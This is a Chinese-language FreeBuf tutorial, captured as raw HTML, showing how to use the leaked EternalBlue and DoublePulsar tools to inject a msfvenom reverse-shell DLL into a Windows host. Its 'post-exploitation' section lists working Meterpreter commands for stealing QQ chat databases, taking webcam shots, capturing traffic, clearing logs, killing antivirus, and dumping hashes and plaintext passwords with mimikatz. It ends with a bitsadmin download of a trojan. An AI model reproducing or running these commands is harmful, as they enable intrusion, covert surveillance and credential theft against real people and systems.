src="http://image.3001.net/2017/04/9f10dff60e982831e4770c85ae5165ef5.png" alt="" style="display: inline;"></a></p><br><noscript>&lt;img src=”<a href="http://image.3001.net/2017/04/9f10dff60e982831e4770c85ae5165ef5.png" target="_blank" rel="external">http://image.3001.net/2017/04/9f10dff60e982831e4770c85ae5165ef5.png</a>“ alt=””&gt;&lt;/p&gt;</noscript><br><p style="text-align: center;"><a href="http://image.3001.net/2017/04/43a1862f82eeb18bf6edb842ab109f4b5.png" class="highslide-image" onclick="return hs.expand(this);" target="_blank"><img data-original="http://image.3001.net/2017/04/43a1862f82eeb18bf6edb842ab109f4b5.png" src="http://image.3001.net/2017/04/43a1862f82eeb18bf6edb842ab109f4b5.png" alt="" style="display: inline;"></a></p><br><noscript>&lt;img src=”<a href="http://image.3001.net/2017/04/43a1862f82eeb18bf6edb842ab109f4b5.png" target="_blank" rel="external">http://image.3001.net/2017/04/43a1862f82eeb18bf6edb842ab109f4b5.png</a>“ alt=””&gt;&lt;/p&gt;</noscript><br><p>然后我们把windows文件夹复制到pentestbox目录下</p><br><p style="text-align: center;">&nbsp;<a href="http://image.3001.net/2017/04/48fac7fdda1a9bbce4e5a0af3b7e46835.png" class="highslide-image" onclick="return hs.expand(this);" target="_blank"><img data-original="http://image.3001.net/2017/04/48fac7fdda1a9bbce4e5a0af3b7e46835.png" src="http://image.3001.net/2017/04/48fac7fdda1a9bbce4e5a0af3b7e46835.png" alt="" style="display: inline;"></a></p><br><noscript>&lt;img src=”<a href="http://image.3001.net/2017/04/48fac7fdda1a9bbce4e5a0af3b7e46835.png" target="_blank" rel="external">http://image.3001.net/2017/04/48fac7fdda1a9bbce4e5a0af3b7e46835.png</a>“ alt=””&gt;&lt;/p&gt;</noscript><br><p>这里我把windows里的文件放到pentestbox根目录下的ms17-010文件夹内</p><br><p style="text-align: center;"><a href="http://image.3001.net/2017/04/d72452ebfa42654d0cb397baaf63e4f05.png" class="highslide-image" onclick="return hs.expand(this);" target="_blank"><img data-original="http://image.3001.net/2017/04/d72452ebfa42654d0cb397baaf63e4f05.png" src="http://image.3001.net/2017/04/d72452ebfa42654d0cb397baaf63e4f05.png" alt="" style="display: inline;"></a></p><br><noscript>&lt;img src=”<a href="http://image.3001.net/2017/04/d72452ebfa42654d0cb397baaf63e4f05.png" target="_blank" rel="external">http://image.3001.net/2017/04/d72452ebfa42654d0cb397baaf63e4f05.png</a>“ alt=””&gt;&lt;/p&gt;</noscript><br><p>我们进入ms07-010目录并执行python26 fb.py    </p><br><p style="text-align: center;"><a href="http://image.3001.net/2017/04/ee9fbfedf2540e5f10cd82e2ed2878a45.png" class="highslide-image" onclick="return hs.expand(this);" target="_blank"><img data-original="http://image.3001.net/2017/04/ee9fbfedf2540e5f10cd82e2ed2878a45.png" src="http://image.3001.net/2017/04/ee9fbfedf2540e5f10cd82e2ed2878a45.png" alt="" style="display: inline;"></a></p><br><noscript>&lt;img src=”<a href="http://image.3001.net/2017/04/ee9fbfedf2540e5f10cd82e2ed2878a45.png" target="_blank" rel="external">http://image.3001.net/2017/04/ee9fbfedf2540e5f10cd82e2ed2878a45.png</a>“ alt=””&gt;&lt;/p&gt;</noscript><br><p>这样我们就可以启动攻击程序了</p><br><p style="text-align: center;"><a href="http://image.3001.net/2017/04/2ef4f1cad48cd5eb4e581edb6ad7f11e5.png" class="highslide-image" onclick="return hs.expand(this);" target="_blank"><img data-original="http://image.3001.net/2017/04/2ef4f1cad48cd5eb4e581edb6ad7f11e5.png" src="http://image.3001.net/2017/04/2ef4f1cad48cd5eb4e581edb6ad7f11e5.png" alt="" style="display: inline;"></a></p><br><noscript>&lt;img src=”<a href="http://image.3001.net/2017/04/2ef4f1cad48cd5eb4e581edb6ad7f11e5.png" target="_blank" rel="external">http://image.3001.net/2017/04/2ef4f1cad48cd5eb4e581edb6ad7f11e5.png</a>“ alt=””&gt;&lt;/p&gt;</noscript><br><a id="more"></a><br><h2>三. 攻击示例</h2><br><p>攻击机：192.168.1.106</p><br><p>靶机： 192.168.1.111 &nbsp; windows x64 SP1</p><br><p>我们先用msf生成dll木马，用于控制目标</p><br><p>msfvenom -p windows/x64/meterpreter/reverse<em>tcp LHOST=xxxx &nbsp;LPORT=9999 -f dll &gt; 9999-64.dll</em></p><br><p>Pentestbox里自带的metasploit框架我在使用总是时出现问题，我一般不用它，我通常是在自己的vps服务器进行监听</p><br><p>本地测试时候可以找一台kali攻击机</p><br><p>dll木马我们可以提前生成好放在u盘里带着，随时备用*<em></em></p><br><p>接下来我们用Msf进行监听</p><br><blockquote><p>　　<b>use exploit/multi/handler</b></p><br><p><b>　　set payload windows/x64/meterpreter/reverse_tcp</b></p><br><p><b>　　set LHOST IP &nbsp; &nbsp; (这里填写vps的内网ip，记得开放监听端口)</b></p><br><p><b>　　set LPORT 9999</b></p><br><p><b>　　set stagerverifysslcert false</b></p><br><p><b>　　exploit -j</b></p><br></blockquote><br><p style="text-align: center;"><strong><a href="http://image.3001.net/2017/04/0e16aace346f4e882f2456234ed468425.png" class="highslide-image" onclick="return hs.expand(this);" target="_blank"><img data-original="http://image.3001.net/2017/04/0e16aace346f4e882f2456234ed468425.png" src="http://image.3001.net/2017/04/0e16aace346f4e882f2456234ed468425.png" alt="" style="display: inline;"></a></strong></p><br><noscript>&lt;img src=”<a href="http://image.3001.net/2017/04/0e16aace346f4e882f2456234ed468425.png" target="_blank" rel="external">http://image.3001.net/2017/04/0e16aace346f4e882f2456234ed468425.png</a>“ alt=””&gt;&lt;/strong&gt;&lt;/p&gt;</noscript><br><p>如果没有设置set stagerverifysslcert false，获取shell的时候可能会出现这样的情况</p><br><p style="text-align: center;"><a href="http://image.3001.net/2017/04/811a9cbad35cf099b081e4177d89f6e75.png" class="highslide-image" onclick="return hs.expand(this);" target="_blank"><img data-original="http://image.3001.net/2017/04/811a9cbad35cf099b081e4177d89f6e75.png" src="http://image.3001.net/2017/04/811a9cbad35cf099b081e4177d89f6e75.png" alt="" style="display: inline;"></a>    </p><br><noscript>&lt;img src=”<a href="http://image.3001.net/2017/04/811a9cbad35cf099b081e4177d89f6e75.png" target="_blank" rel="external">http://image.3001.net/2017/04/811a9cbad35cf099b081e4177d89f6e75.png</a>“ alt=””&gt;    &lt;/p&gt;</noscript><br><p>回到fb.py中，开始攻击</p><br><p>[?] Default Target IP Address [] : &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;攻击目标</p><br><p>[?] Default Callback IP Address [] : &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;本机ip</p><br><p>[?] Use Redirection [yes] : no &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;是否重定向</p><br><p>[?] Base Log directory [D:\logs] : &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;是否输出日志</p><br><p>然后创建一个项目实例</p><br><p style="text-align: center;"><a href="http://image.3001.net/2017/04/a9a092b8dddff439baa589d5f02f964f5.png" class="highslide-image" onclick="return hs.expand(this);" target="_blank"><img data-original="http://image.3001.net/2017/04/a9a092b8dddff439baa589d5f02f964f5.png" src="http://image.3001.net/2017/04/a9a092b8dddff439baa589d5f02f964f5.png" alt="" style="display: inline;"></a></p><br><noscript>&lt;img src=”<a href="http://image.3001.net/2017/04/a9a092b8dddff439baa589d5f02f964f5.png" target="_blank" rel="external">http://image.3001.net/2017/04/a9a092b8dddff439baa589d5f02f964f5.png</a>“ alt=””&gt;&lt;/p&gt;</noscript><br><p>如果你之前创建过实例，可以选择它，改设置，也可以重新创建一个</p><br><p style="text-align: center;"><a href="http://image.3001.net/2017/04/b7a1379b5cbc3067231e800bbefc05335.png" class="highslide-image" onclick="return hs.expand(this);" target="_blank"><img data-original="http://image.3001.net/2017/04/b7a1379b5cbc3067231e800bbefc05335.png" src="http://image.3001.net/2017/04/b7a1379b5cbc3067231e800bbefc05335.png" alt="" style="display: inline;"></a></p><br><noscript>&lt;img src=”<a href="http://image.3001.net/2017/04/b7a1379b5cbc3067231e800bbefc05335.png" target="_blank" rel="external">http://image.3001.net/2017/04/b7a1379b5cbc3067231e800bbefc05335.png</a>“ alt=””&gt;&lt;/p&gt;</noscript><br><p>输入命令 use 可以查看我们利用的exp模块</p><br><p>我们使用EternalBlue模块，use EternalBlue</p><br><p style="text-align: center;"><a href="http://image.3001.net/2017/04/110331facfff33f7b032aa91c5a422f95.png" class="highslide-image" onclick="return hs.expand(this);" target="_blank"><img data-original="http://image.3001.net/2017/04/110331facfff33f7b032aa91c5a422f95.png" src="http://image.3001.net/2017/04/110331facfff33f7b032aa91c5a422f95.png" alt="" style="display: inline;"></a></p><br><noscript>&lt;img src=”<a href="http://image.3001.net/2017/04/110331facfff33f7b032aa91c5a422f95.png" target="_blank" rel="external">http://image.3001.net/2017/04/110331facfff33f7b032aa91c5a422f95.png</a>“ alt=””&gt;&lt;/p&gt;</noscript><br><p>&nbsp;下面一直回车就行</p><br><p style="text-align: center;"><a href="http://image.3001.net/2017/04/ef97a15039fba620f9273b84f78e53015.png" class="highslide-image" onclick="return hs.expand(this);" target="_blank"><img data-original="http://image.3001.net/2017/04/ef97a15039fba620f9273b84f78e53015.png" src="http://image.3001.net/2017/04/ef97a15039fba620f9273b84f78e53015.png" alt="" style="display: inline;"></a></p><br><noscript>&lt;img src=”<a href="http://image.3001.net/2017/04/ef97a15039fba620f9273b84f78e53015.png" target="_blank" rel="external">http://image.3001.net/2017/04/ef97a15039fba620f9273b84f78e53015.png</a>“ alt=””&gt;&lt;/p&gt;</noscript><br><p>选择攻击目标的系统</p><br><p style="text-align: center;"><a href="http://image.3001.net/2017/04/2f0a0c3dac53588f3a86859675c4b2fe5.png" class="highslide-image" onclick="return hs.expand(this);" target="_blank"><img data-original="http://image.3001.net/2017/04/2f0a0c3dac53588f3a86859675c4b2fe5.png" src="http://image.3001.net/2017/04/2f0a0c3dac53588f3a86859675c4b2fe5.png" alt="" style="display: inline;"></a>    </p><br><noscript>&lt;img src=”<a href="http://image.3001.net/2017/04/2f0a0c3dac53588f3a86859675c4b2fe5.png" target="_blank" rel="external">http://image.3001.net/2017/04/2f0a0c3dac53588f3a86859675c4b2fe5.png</a>“ alt=””&gt;    &lt;/p&gt;</noscript><br><p>这里会询问你payload传输方式&nbsp;&nbsp;选择1，感觉更稳定些</p><br><p style="text-align: center;"><a href="http://image.3001.net/2017/04/85a7032990db9f2248f5f60184dfc0e35.png" class="highslide-image" onclick="return hs.expand(this);" target="_blank"><img data-original="http://image.3001.net/2017/04/85a7032990db9f2248f5f60184dfc0e35.png" src="http://image.3001.net/2017/04/85a7032990db9f2248f5f60184dfc0e35.png" alt="" style="display: inline;"></a></p><br><noscript>&lt;img src=”<a href="http://image.3001.net/2017/04/85a7032990db9f2248f5f60184dfc0e35.png" target="_blank" rel="external">http://image.3001.net/2017/04/85a7032990db9f2248f5f60184dfc0e35.png</a>“ alt=””&gt;&lt;/p&gt;</noscript><br><p style="text-align: center;"><a href="http://image.3001.net/2017/04/3d86b83f2379a16a2ef8cf4a899e85f15.png" class="highslide-image" onclick="return hs.expand(this);" target="_blank"><img data-original="http://image.3001.net/2017/04/3d86b83f2379a16a2ef8cf4a899e85f15.png" src="http://image.3001.net/2017/04/3d86b83f2379a16a2ef8cf4a899e85f15.png" alt="" style="display: inline;"></a></p><br><noscript>&lt;img src=”<a href="http://image.3001.net/2017/04/3d86b83f2379a16a2ef8cf4a899e85f15.png" target="_blank" rel="external">http://image.3001.net/2017/04/3d86b83f2379a16a2ef8cf4a899e85f15.png</a>“ alt=””&gt;&lt;/p&gt;</noscript><br><p>继续回车，确认信息</p><br><p style="text-align: center;"><a href="http://image.3001.net/2017/04/94389c851f1a40cbbd5ac73e79cb07ec5.png" class="highslide-image" onclick="return hs.expand(this);" target="_blank"><img data-original="http://image.3001.net/2017/04/94389c851f1a40cbbd5ac73e79cb07ec5.png" src="http://image.3001.net/2017/04/94389c851f1a40cbbd5ac73e79cb07ec5.png" alt="" style="display: inline;"></a></p><br><noscript>&lt;img src=”<a href="http://image.3001.net/2017/04/94389c851f1a40cbbd5ac73e79cb07ec5.png" target="_blank" rel="external">http://image.3001.net/2017/04/94389c851f1a40cbbd5ac73e79cb07ec5.png</a>“ alt=””&gt;&lt;/p&gt;</noscript><br><p style="text-align: center;">&nbsp;<a href="http://image.3001.net/2017/04/97f6d729521da2ec855fbe6124e5ed805.png" class="highslide-image" onclick="return hs.expand(this);" target="_blank"><img data-original="http://image.3001.net/2017/04/97f6d729521da2ec855fbe6124e5ed805.png" src="http://image.3001.net/2017/04/97f6d729521da2ec855fbe6124e5ed805.png" alt="" style="display: inline;"></a></p><br><noscript>&lt;img src=”<a href="http://image.3001.net/2017/04/97f6d729521da2ec855fbe6124e5ed805.png" target="_blank" rel="external">http://image.3001.net/2017/04/97f6d729521da2ec855fbe6124e5ed805.png</a>“ alt=””&gt;&lt;/p&gt;</noscript><br><p>成功之后，我们使用doublepulsar模块</p><br><p style="text-align: center;"><a href="http://image.3001.net/2017/04/8dfd507773c728b331819c29ae4b890a5.png" class="highslide-image" onclick="return hs.expand(this);" target="_blank"><img data-original="http://image.3001.net/2017/04/8dfd507773c728b331819c29ae4b890a5.png" src="http://image.3001.net/2017/04/8dfd507773c728b331819c29ae4b890a5.png" alt="" style="display: inline;"></a></p><br><noscript>&lt;img src=”<a href="http://image.3001.net/2017/04/8dfd507773c728b331819c29ae4b890a5.png" target="_blank" rel="external">http://image.3001.net/2017/04/8dfd507773c728b331819c29ae4b890a5.png</a>“ alt=””&gt;&lt;/p&gt;</noscript><br><p>继续一路回车</p><br><p style="text-align: center;"><a href="http://image.3001.net/2017/04/225333534542f4308678f420c6c8fbb25.png" class="highslide-image" onclick="return hs.expand(this);" target="_blank"><img data-original="http://image.3001.net/2017/04/225333534542f4308678f420c6c8fbb25.png" src="http://image.3001.net/2017/04/225333534542f4308678f420c6c8fbb25.png" alt="" style="display: inline;"></a></p><br><noscript>&lt;img src=”<a href="http://image.3001.net/2017/04/225333534542f4308678f420c6c8fbb25.png" target="_blank" rel="external">http://image.3001.net/2017/04/225333534542f4308678f420c6c8fbb25.png</a>“ alt=””&gt;&lt;/p&gt;</noscript><br><p>&nbsp;选择协议</p><br><p style="text-align: center;"><a href="http://image.3001.net/2017/04/3066a988deaec1d404601ea9ad3f069d5.png" class="highslide-image" onclick="return hs.expand(this);" target="_blank"><img data-original="http://image.3001.net/2017/04/3066a988deaec1d404601ea9ad3f069d5.png" src="http://image.3001.net/2017/04/3066a988deaec1d404601ea9ad3f069d5.png" alt="" style="display: inline;"></a></p><br><noscript>&lt;img src=”<a href="http://image.3001.net/2017/04/3066a988deaec1d404601ea9ad3f069d5.png" target="_blank" rel="external">http://image.3001.net/2017/04/3066a988deaec1d404601ea9ad3f069d5.png</a>“ alt=””&gt;&lt;/p&gt;</noscript><br><p>&nbsp;选择目标系统</p><br><p style="text-align: center;"><a href="http://image.3001.net/2017/04/1909043ec32e444c997285bea7bf50a45.png" class="highslide-image" onclick="return hs.expand(this);" target="_blank"><img data-original="http://image.3001.net/2017/04/1909043ec32e444c997285bea7bf50a45.png" src="http://image.3001.net/2017/04/1909043ec32e444c997285bea7bf50a45.png" alt="" style="display: inline;"></a></p><br><noscript>&lt;img src=”<a href="http://image.3001.net/2017/04/1909043ec32e444c997285bea7bf50a45.png" target="_blank" rel="external">http://image.3001.net/2017/04/1909043ec32e444c997285bea7bf50a45.png</a>“ alt=””&gt;&lt;/p&gt;</noscript><br><p>选择攻击方式，我们利用dll木马</p><br><p style="text-align: center;"><a href="http://image.3001.net/2017/04/9223922f3a70e3989c28582fb0a0ef375.png" class="highslide-image" onclick="return hs.expand(this);" target="_blank"><img data-original="http://image.3001.net/2017/04/9223922f3a70e3989c28582fb0a0ef375.png" src="http://image.3001.net/2017/04/9223922f3a70e3989c28582fb0a0ef375.png" alt="" style="display: inline;"></a></p><br><noscript>&lt;img src=”<a href="http://image.3001.net/2017/04/9223922f3a70e3989c28582fb0a0ef375.png" target="_blank" rel="external">http://image.3001.net/2017/04/9223922f3a70e3989c28582fb0a0ef375.png</a>“ alt=””&gt;&lt;/p&gt;</noscript><br><p>设置dll木马路径，我已经提前生成好放在u盘里随身携带，随时备用~</p><br><p style="text-align: center;"><a href="http://image.3001.net/2017/04/27b508788fd2c6d0b722f08f32e564125.png" class="highslide-image" onclick="return hs.expand(this);" target="_blank"><img data-original="http://image.3001.net/2017/04/27b508788fd2c6d0b722f08f32e564125.png" src="http://www.freebuf.com/buf/themes/freebuf/images/grey.gif" alt=""></a></p><br><noscript>&lt;img src=”<a href="http://image.3001.net/2017/04/27b508788fd2c6d0b722f08f32e564125.png" target="_blank" rel="external">http://image.3001.net/2017/04/27b508788fd2c6d0b722f08f32e564125.png</a>“ alt=””&gt;&lt;/p&gt;</noscript><br><p style="text-align: center;"><a href="http://image.3001.net/2017/04/5c76c2280492ed2d97d98bb3622edec85.png" class="highslide-image" onclick="return hs.expand(this);" target="_blank"><img data-original="http://image.3001.net/2017/04/5c76c2280492ed2d97d98bb3622edec85.png" src="http://www.freebuf.com/buf/themes/freebuf/images/grey.gif" alt=""></a></p><br><noscript>&lt;img src=”<a href="http://image.3001.net/2017/04/5c76c2280492ed2d97d98bb3622edec85.png" target="_blank" rel="external">http://image.3001.net/2017/04/5c76c2280492ed2d97d98bb3622edec85.png</a>“ alt=””&gt;&lt;/p&gt;</noscript><br><p>然后设置要注入的程序，默认是lsass.exe</p><br><p style="text-align: center;">&nbsp;<a href="http://image.3001.net/2017/04/646653966afe8879bdbd363ce2f3ba0b5.png" class="highslide-image" onclick="return hs.expand(this);" target="_blank"><img data-original="http://image.3001.net/2017/04/646653966afe8879bdbd363ce2f3ba0b5.png" src="http://www.freebuf.com/buf/themes/freebuf/images/grey.gif" alt=""></a></p><br><noscript>&lt;img src=”<a href="http://image.3001.net/2017/04/646653966afe8879bdbd363ce2f3ba0b5.png" target="_blank" rel="external">http://image.3001.net/2017/04/646653966afe8879bdbd363ce2f3ba0b5.png</a>“ alt=””&gt;&lt;/p&gt;</noscript><br><p>这里注入的进程会对目标造成影响，也试了几个其他程序，比如注explorer时候，会弹出一个报错框</p><br><p>注入其他进程，有时候或多或少都会出那么点问题</p><br><p style="text-align: center;"><a href="http://image.3001.net/2017/04/38c6aa67359276b79182d167df549c795.png" class="highslide-image" onclick="return hs.expand(this);" target="_blank"><img data-original="http://image.3001.net/2017/04/38c6aa67359276b79182d167df549c795.png" src="http://www.freebuf.com/buf/themes/freebuf/images/grey.gif" alt=""></a></p><br><noscript>&lt;img src=”<a href="http://image.3001.net/2017/04/38c6aa67359276b79182d167df549c795.png" target="_blank" rel="external">http://image.3001.net/2017/04/38c6aa67359276b79182d167df549c795.png</a>“ alt=””&gt;&lt;/p&gt;</noscript><br><p style="text-align: center;"><a href="http://image.3001.net/2017/04/32c761c337dd8f08fee7569e0d6b747e5.png" class="highslide-image" onclick="return hs.expand(this);" target="_blank"><img data-original="http://image.3001.net/2017/04/32c761c337dd8f08fee7569e0d6b747e5.png" src="http://www.freebuf.com/buf/themes/freebuf/images/grey.gif" alt=""></a></p><br><noscript>&lt;img src=”<a href="http://image.3001.net/2017/04/32c761c337dd8f08fee7569e0d6b747e5.png" target="_blank" rel="external">http://image.3001.net/2017/04/32c761c337dd8f08fee7569e0d6b747e5.png</a>“ alt=””&gt;&lt;/p&gt;</noscript><br><p>然后是一路回车</p><br><p style="text-align: center;"><a href="http://image.3001.net/2017/04/41ec1da6c66a496680664ca31d6d07935.png" class="highslide-image" onclick="return hs.expand(this);" target="_blank"><img data-original="http://image.3001.net/2017/04/41ec1da6c66a496680664ca31d6d07935.png" src="http://www.freebuf.com/buf/themes/freebuf/images/grey.gif" alt=""></a></p><br><noscript>&lt;img src=”<a href="http://image.3001.net/2017/04/41ec1da6c66a496680664ca31d6d07935.png" target="_blank" rel="external">http://image.3001.net/2017/04/41ec1da6c66a496680664ca31d6d07935.png</a>“ alt=””&gt;&lt;/p&gt;</noscript><br><p style="text-align: center;"><a href="http://image.3001.net/2017/04/f79e0dcbe8a1534a697e242cfd57a19a5.png" class="highslide-image" onclick="return hs.expand(this);" target="_blank"><img data-original="http://image.3001.net/2017/04/f79e0dcbe8a1534a697e242cfd57a19a5.png" src="http://www.freebuf.com/buf/themes/freebuf/images/grey.gif" alt=""></a></p><br><noscript>&lt;img src=”<a href="http://image.3001.net/2017/04/f79e0dcbe8a1534a697e242cfd57a19a5.png" target="_blank" rel="external">http://image.3001.net/2017/04/f79e0dcbe8a1534a697e242cfd57a19a5.png</a>“ alt=””&gt;&lt;/p&gt;</noscript><br><p style="text-align: center;"><a href="http://image.3001.net/2017/04/e4e5ce3034704013c98335850c7de05f5.png" class="highslide-image" onclick="return hs.expand(this);" target="_blank"><img data-original="http://image.3001.net/2017/04/e4e5ce3034704013c98335850c7de05f5.png" src="http://www.freebuf.com/buf/themes/freebuf/images/grey.gif" alt=""></a></p><br><noscript>&lt;img src=”<a href="http://image.3001.net/2017/04/e4e5ce3034704013c98335850c7de05f5.png" target="_blank" rel="external">http://image.3001.net/2017/04/e4e5ce3034704013c98335850c7de05f5.png</a>“ alt=””&gt;&lt;/p&gt;</noscript><br><p>最后一步执行攻击</p><br><p style="text-align: center;"><a href="http://image.3001.net/2017/04/92c19108d6debf35d5f14d57d2ce2a965.png" class="highslide-image" onclick="return hs.expand(this);" target="_blank"><img data-original="http://image.3001.net/2017/04/92c19108d6debf35d5f14d57d2ce2a965.png" src="http://www.freebuf.com/buf/themes/freebuf/images/grey.gif" alt=""></a></p><br><noscript>&lt;img src=”<a href="http://image.3001.net/2017/04/92c19108d6debf35d5f14d57d2ce2a965.png" target="_blank" rel="external">http://image.3001.net/2017/04/92c19108d6debf35d5f14d57d2ce2a965.png</a>“ alt=””&gt;&lt;/p&gt;</noscript><br><p>Msf这里成功获取shell</p><br><p style="text-align: center;"><a href="http://image.3001.net/2017/04/0bba88da2357d39e9c02d68816fb79215.png" class="highslide-image" onclick="return hs.expand(this);" target="_blank"><img data-original="http://image.3001.net/2017/04/0bba88da2357d39e9c02d68816fb79215.png" src="http://www.freebuf.com/buf/themes/freebuf/images/grey.gif" alt=""></a></p><br><noscript>&lt;img src=”<a href="http://image.3001.net/2017/04/0bba88da2357d39e9c02d68816fb79215.png" target="_blank" rel="external">http://image.3001.net/2017/04/0bba88da2357d39e9c02d68816fb79215.png</a>“ alt=””&gt;&lt;/p&gt;</noscript><br><p style="text-align: center;"><a href="http://image.3001.net/2017/04/3e3ded820afcc484e75ff77029d0891b5.png" class="highslide-image" onclick="return hs.expand(this);" target="_blank"><img data-original="http://image.3001.net/2017/04/3e3ded820afcc484e75ff77029d0891b5.png" src="http://www.freebuf.com/buf/themes/freebuf/images/grey.gif" alt=""></a></p><br><noscript>&lt;img src=”<a href="http://image.3001.net/2017/04/3e3ded820afcc484e75ff77029d0891b5.png" target="_blank" rel="external">http://image.3001.net/2017/04/3e3ded820afcc484e75ff77029d0891b5.png</a>“ alt=””&gt;&lt;/p&gt;</noscript><br><p>截个屏看看</p><br><p style="text-align: center;"><a href="http://image.3001.net/2017/04/e86a3debc0a8e0c5b8e9d35cacc8952f5.png" class="highslide-image" onclick="return hs.expand(this);" target="_blank"><img data-original="http://image.3001.net/2017/04/e86a3debc0a8e0c5b8e9d35cacc8952f5.png" src="http://www.freebuf.com/buf/themes/freebuf/images/grey.gif" alt=""></a></p><br><noscript>&lt;img src=”<a href="http://image.3001.net/2017/04/e86a3debc0a8e0c5b8e9d35cacc8952f5.png" target="_blank" rel="external">http://image.3001.net/2017/04/e86a3debc0a8e0c5b8e9d35cacc8952f5.png</a>“ alt=””&gt;&lt;/p&gt;</noscript><br><p style="text-align: center;"><a href="http://image.3001.net/2017/04/ea42be751f0f5cd4c69d4780d12cc9d85.png" class="highslide-image" onclick="return hs.expand(this);" target="_blank"><img data-original="http://image.3001.net/2017/04/ea42be751f0f5cd4c69d4780d12cc9d85.png" src="http://www.freebuf.com/buf/themes/freebuf/images/grey.gif" alt=""></a></p><br><noscript>&lt;img src=”<a href="http://image.3001.net/2017/04/ea42be751f0f5cd4c69d4780d12cc9d85.png" target="_blank" rel="external">http://image.3001.net/2017/04/ea42be751f0f5cd4c69d4780d12cc9d85.png</a>“ alt=””&gt;&lt;/p&gt;</noscript><br><p>一个正在成长中的团队，欢迎交流，分享，合作~</p><br><h2>四. 后渗透辅助命令</h2><br><p><b>下面是一些示例命令，配合这些命令，happy to play~</b></p><br><p>meterpreter</p><br><p>upload /root/nc.exe c:\windows\system32　　#上传文件</p><br><p>search –d c:\windows –f .mdb &nbsp; &nbsp; &nbsp; &nbsp;　　 　　#在目标主机Windows目录中搜索文件s&nbsp;</p><br><p><b>执行程序</b></p><br><p>execute -H -i -f cmd.exe #隐藏执行cmd并与之交互</p><br><p>execute -H -m -d calc.exe -f wce.exe -a “-o foo.txt” &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; #隐藏执行，并显示虚假运行程序&nbsp;</p><br><p>我们可以用远控生成一个木马传过去</p><br><p style="text-align: center;"><a href="http://image.3001.net/2017/04/a36beaa4671fcf588674a3bb39eb03ff5.png" class="highslide-image" onclick="return hs.expand(this);" target="_blank"><img data-original="http://image.3001.net/2017/04/a36beaa4671fcf588674a3bb39eb03ff5.png" src="http://www.freebuf.com/buf/themes/freebuf/images/grey.gif" alt=""></a></p><br><noscript>&lt;img src=”<a href="http://image.3001.net/2017/04/a36beaa4671fcf588674a3bb39eb03ff5.png" target="_blank" rel="external">http://image.3001.net/2017/04/a36beaa4671fcf588674a3bb39eb03ff5.png</a>“ alt=””&gt;&lt;/p&gt;</noscript><br><p style="text-align: center;"><a href="http://image.3001.net/2017/04/cb12ca6575a3e05cf74725c2c4c6c3e85.png" class="highslide-image" onclick="return hs.expand(this);" target="_blank"><img data-original="http://image.3001.net/2017/04/cb12ca6575a3e05cf74725c2c4c6c3e85.png" src="http://www.freebuf.com/buf/themes/freebuf/images/grey.gif" alt=""></a></p><br><noscript>&lt;img src=”<a href="http://image.3001.net/2017/04/cb12ca6575a3e05cf74725c2c4c6c3e85.png" target="_blank" rel="external">http://image.3001.net/2017/04/cb12ca6575a3e05cf74725c2c4c6c3e85.png</a>“ alt=””&gt;&lt;/p&gt;</noscript><br><p style="text-align: center;"><a href="http://image.3001.net/2017/04/e58c909ec4346e1e88f4d593e62df1e35.png" class="highslide-image" onclick="return hs.expand(this);" target="_blank"><img data-original="http://image.3001.net/2017/04/e58c909ec4346e1e88f4d593e62df1e35.png" src="http://www.freebuf.com/buf/themes/freebuf/images/grey.gif" alt="" width="782"></a></p><br><noscript>&lt;img src=”<a href="http://image.3001.net/2017/04/e58c909ec4346e1e88f4d593e62df1e35.png" target="_blank" rel="external">http://image.3001.net/2017/04/e58c909ec4346e1e88f4d593e62df1e35.png</a>“ alt=”” width=”782” height=”568”&gt;&lt;/p&gt;</noscript><br><p><b>例：下载目标聊天记录到本地/tmp目录下，可用Qqlogger查看</b></p><br><p>download c:\Programs Files\Tecent\QQ\Users\qq号\Msg2.0.db /tmp</p><br><p>run webcam -p 图片保存路径 &nbsp; &nbsp; &nbsp; &nbsp;　　#开启目标摄像头并截图</p><br><p>run packetrecorder –i 会话序号 　　#捕获流量数据包.pcap</p><br><p><b>提权</b></p><br><p>use privs</p><br><p>getsystem</p><br><p>getuid</p><br><p>clearev –清除日志 &nbsp;</p><br><p>run killav –干掉杀软 &nbsp; &nbsp; &nbsp; &nbsp;</p><br><p><b>文件关联</b></p><br><p>改变文件类型关联DLL到 txt文件类型： assoc .dll=txtfile</p><br><p>改变文件类型关联EXE 到png文件类型： assoc .exe=pngfile</p><br><p>改变文件类型关联MP3到jpg文件类型： assoc .mp3=jpgfile</p><br><p><b>Hash获取</b></p><br><p>hashdump或run hashdump或run smart_hashdump</p><br><p>&gt;run post/windows/gather/hashdump</p><br><p>&gt;run /windows/gather/smart_hashdump &nbsp; &nbsp; &nbsp; &nbsp;–可绕过windows UAC控制</p><br><p><b>用kiwi获取明文密码：</b></p><br><p>meterpreter&gt;load kiwi</p><br><p>meterpreter&gt; creds_all</p><br><p><b>Metaspolit中使用Mimikatz:</b></p><br><p>使用metasploit内建的命令：</p><br><p>meterpreter &gt; load mimikatz</p><br><p>meterpreter &gt; msv &nbsp; #msv creden</p><br><p>meterpreter &gt; kerberostials #kerberos credentials</p><br><p><b>使用mimikatz自带的命令：</b></p><br><p>meterpreter &gt; mimikatz_command -f samdump::hashes</p><br><p>meterpreter &gt; mimikatz_command -f sekurlsa::searchPasswords</p><br><p>&lt;前面一句命令在密码超过14位时LM会为空，后一句命令可以得到明文&gt;</p><br><p><b>利用windows命令下载文件</b></p><br><p>bitsadmin /transfer mydownJob /download /priority normal “<a href="http://url/muma.exe" target="_blank" rel="external">http://url/muma.exe</a>” &nbsp; “F:\muma.exe “</p><br><p>详细用法可参考：<a href="https://technet.microsoft.com/zh-cn/library/cc753856" target="_blank" rel="external">https://technet.microsoft.com/zh-cn/library/cc753856</a>(v=ws.10).aspx</p><br><p>最后：</p><br><p>4月18日下午有人在i春秋发布了批量利用脚本</p><br><p><a href="https://bbs.ichunqiu.com/thread-21863-1-1.html" target="_blank" rel="external">https://bbs.ichunqiu.com/thread-21863-1-1.html</a></p><br><p><b><span style="color: rgb(239, 71, 71);"><span style="font-size: 11pt;">*</span><span style="">本文原创作者：ssooking，本文属FreeBuf原创奖励计划，未经许可禁止转载</span></span>    </b></p><br>                                                    </div>]]></content>
    
    <summary type="html">
    
